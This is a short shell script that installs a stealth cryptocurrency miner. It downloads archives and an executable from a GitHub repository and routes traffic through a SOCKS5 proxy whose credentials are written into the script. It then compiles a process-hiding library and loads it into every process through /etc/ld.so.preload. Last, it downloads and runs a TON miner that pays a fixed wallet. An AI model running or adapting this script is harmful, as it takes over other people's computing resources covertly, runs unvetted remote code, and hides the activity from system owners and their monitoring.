#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.223.155.101:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek

chmod +x pepek

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip

unzip pepek.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz

tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz

chmod +x danila-miner

./danila-miner run https://pool.services.tonwhales.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
